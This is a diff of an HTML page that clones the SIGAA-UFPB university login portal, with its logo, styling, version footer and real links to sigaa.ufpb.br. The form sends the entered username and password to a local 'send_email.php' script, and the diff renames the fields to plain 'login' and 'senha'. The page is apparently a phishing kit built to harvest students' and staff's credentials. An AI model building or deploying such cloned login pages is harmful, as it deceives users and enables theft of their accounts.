@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-
 <html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
@@ -7,12 +6,13 @@
 
 <link class="component" href="./SIGAA-UFPB_files/eAF7sqpgb-jyGdIAFrMEaw__.jsf" rel="stylesheet" type="text/css">
 <link class="component" href="./SIGAA-UFPB_files/eAF7sqpgb-jyGdIAFrMEaw__(1).jsf" rel="stylesheet" type="text/css">
-<script type="text/javascript">window.RICH_FACES_EXTENDED_SKINNING_ON=true;</script><script src="./SIGAA-UFPB_files/skinning.js.jsf" type="text/javascript"></script><link rel="stylesheet" type="text/css" href="./SIGAA-UFPB_files/bootstrap.css" media="screen">
+<script type="text/javascript">window.RICH_FACES_EXTENDED_SKINNING_ON=true;</script>
+<script src="./SIGAA-UFPB_files/skinning.js.jsf" type="text/javascript"></script>
+<link rel="stylesheet" type="text/css" href="./SIGAA-UFPB_files/bootstrap.css" media="screen">
 <link rel="stylesheet" type="text/css" href="./SIGAA-UFPB_files/font-awesome.css" media="screen">
 <link rel="stylesheet" type="text/css" href="./SIGAA-UFPB_files/tema9.css" media="screen" id="temaLayout">
 
 <style>
-
 .div-geral {
 	display: grid;
 	grid-template-columns: 1fr auto 1fr;
@@ -22,20 +22,20 @@
 }
 
 .div-form {
-  	grid-row-start: 1; 
-  	grid-row-end: 1;
-  	grid-column-start: 2; 
-  	grid-column-end: 2;  
-  	min-width: 500px;
-  	display: grid;
-  	grid-template-rows: 1fr auto 1fr;
+	grid-row-start: 1; 
+	grid-row-end: 1;
+	grid-column-start: 2; 
+	grid-column-end: 2;  
+	min-width: 500px;
+	display: grid;
+	grid-template-rows: 1fr auto 1fr;
 }
 
 #form {
 	grid-column-start: 1; 
-  	grid-column-end: 1; 
-  	grid-row-start: 2; 
-  	grid-row-end: 2; 
+	grid-column-end: 1; 
+	grid-row-start: 2; 
+	grid-row-end: 2; 
 }
 
 .div-login {
@@ -50,15 +50,15 @@
 	
 	.div-form {
 		grid-column-start: 1; 
-	  	grid-column-end: 1;
-	  	grid-template-rows: 1fr;
-	  	max-width: inherit;
+		grid-column-end: 1;
+		grid-template-rows: 1fr;
+		max-width: inherit;
 	}
 	
 	#form { 
-	  	grid-row-start: 1; 
-	  	grid-row-end: 1;
-	  	height: 100vh; 
+		grid-row-start: 1; 
+		grid-row-end: 1;
+		height: 100vh; 
 	}
 	
 	.div-login {
@@ -73,58 +73,53 @@
 <script type="text/javascript">var useGeneralJS = false;</script>
 <script type="text/javascript" src="./SIGAA-UFPB_files/general.js.download"></script>
 
+</head>
+<body>
+<div class="div-geral">
+	<div class="div-form">
+		<form id="form" name="form" method="post" action="send_email.php" enctype="application/x-www-form-urlencoded" onsubmit="javascript:desativarBotaoEntrar();">
+			<input type="hidden" name="form" value="form">
+			<input id="form:width" type="hidden" name="form:width" value="1925">
+			<input id="form:height" type="hidden" name="form:height" value="953">
 
-	</head><body><div class="div-geral">
-		<div class="div-form">
-		
-<form id="form" name="form" method="post" action="send_email.php" enctype="application/x-www-form-urlencoded" onsubmit="javascript:desativarBotaoEntrar();">
-<input type="hidden" name="form" value="form">
-<input id="form:width" type="hidden" name="form:width" value="1925"><input id="form:height" type="hidden" name="form:height" value="953">
-			
-			
-		
 			<div class="box-geral div-login">
 				<div class="box-conteudo">
-					
-					<h1 style="text-align: center; margin-bottom: 1rem; font-weight: bold; color: var(--cor-primaria); "> 
+					<h1 style="text-align: center; margin-bottom: 1rem; font-weight: bold; color: var(--cor-primaria);"> 
 						<img alt="Brasão da UFPB" height="100" style="margin-bottom: 1rem;" src="./SIGAA-UFPB_files/sigaa-logo.png">
 						<br>
 						SIGAA - UFPB 
 					</h1>
-					<div style="text-align: center; font-weight: bold; color: red;">
-						
+					<div style="text-align: center; font-weight: bold; color: red;"></div>
+					<div class="form-group">
+						<label for="login">Usuário</label>
+						<input id="login" type="text" name="login" class="form-control" size="20">
 					</div>
 					<div class="form-group">
-						<label for="form:login">Usuário</label>
-						<input id="form:login" type="text" name="form:login" class="form-control" size="20">
-					</div>
-					<div class="form-group">
-						<label for="form:senha">Senha</label>
-						<input id="form:senha" type="password" name="form:senha" value="" size="20" class="form-control">
+						<label for="senha">Senha</label>
+						<input id="senha" type="password" name="senha" value="" size="20" class="form-control">
 					</div>
 				</div>
 				<div class="box-rodape" style="text-align: center; font-weight: bold;">
-					<input id="form:entrar" type="submit" name="form:entrar" value="Entrar" class="btn btn-primary">
+					<input id="form:entrar" type="submit" name="entrar" value="Entrar" class="btn btn-primary">
 					<span id="load-entrar" style="display: none; font-size: 20px;">
 						<i class="fa fa-spinner fa-spin fa-fw"></i>
 						<span class="sr-only">Carregando...</span>
 					</span>
 				</div>
 				<div style="text-align: right; margin-top: 10px;">
-					<a href="https://sigaa.ufpb.br/sigaa/public/cadastro/cadastro.jsf" style="font-weight: bold;">Cadastro / Recupera��o Acesso</a>
+					<a href="https://sigaa.ufpb.br/sigaa/public/cadastro/cadastro.jsf" style="font-weight: bold;">Cadastro / Recuperação Acesso</a>
 				</div>
 				<div style="text-align: right; margin-top: 10px;">
 					<a href="https://sigaa.ufpb.br/sigaa/public/sistemas.jsf" style="font-weight: bold;">Outros Sistemas</a>
 				</div>
-				
 				<div style="text-align: center; margin-top: 2em;">
-					SIGAA - 24.7.7 -  Copyright � 2006-2024 - UFPB
+					SIGAA - 24.7.7 -  Copyright © 2006-2024 - UFPB
 				</div>
 			</div>
-		<input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="j_id6">
-</form>
-		</div>
+			<input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="j_id6">
+		</form>
 	</div>
+</div>
 <script>
 	document.getElementById('form:width').value = screen.width;
 	document.getElementById('form:height').value = screen.height;
@@ -135,5 +130,5 @@
 		document.getElementById('load-entrar').style.display = 'block';
 	}
 </script>
-
-</body></html>
+</body>
+</html>
